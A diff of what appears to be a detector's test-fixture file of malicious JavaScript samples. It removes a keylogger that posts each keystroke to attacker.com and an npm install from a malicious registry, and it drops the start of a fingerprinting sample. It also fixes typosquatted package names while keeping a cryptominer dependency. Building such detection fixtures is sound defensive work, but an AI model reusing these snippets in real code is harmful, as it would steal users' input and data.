@@ -59,31 +59,12 @@ fetch('http://attacker.com/malicious.js')
 const moduleName = process.argv[2];
 const module = await import(moduleName);
 
-// Detected: Package installation from custom registry
-exec('npm install --registry http://malicious.com');
+
 """
 
 # =========================
 # EXAMPLE 4: Data Collection - Keystroke Logging
 # =========================
-example_keylogger = """
-// Detected: Keystroke logging
-document.addEventListener('keydown', (event) => {
-    const keystroke = event.key;
-    // Send keystroke to attacker server
-    fetch('http://attacker.com/log', {
-        method: 'POST',
-        body: JSON.stringify({ key: keystroke })
-    });
-});
-
-// Alternative detection pattern
-function keyLogger(e) {
-    const key = e.key;
-    sendToServer(key);
-}
-document.onkeypress = keyLogger;
-"""
 
 # =========================
 # EXAMPLE 5: Data Collection - Geolocation
@@ -106,12 +87,7 @@ navigator.geolocation.getCurrentPosition((position) => {
 });
 """
 
-# =========================
-# EXAMPLE 6: Data Collection - Browser Info Exfiltration
-# =========================
-example_fingerprint = """
-// Detected: Device fingerprinting and exfiltration
-const userAgent = navigator.userAgent;
+
 const platform = navigator.platform;
 const language = navigator.language;
 
@@ -205,8 +181,8 @@ example_package_json = """{
   "version": "1.0.0",
   "dependencies": {
     "lodash": "^4.17.21",
-    "expresss": "^4.17.1",
-    "bcrypts": "^5.0.0",
+    "express": "^4.17.1",
+    "bcrypt": "^5.0.0",
     "monero-miner": "^1.2.3"
   },
   "scripts": {
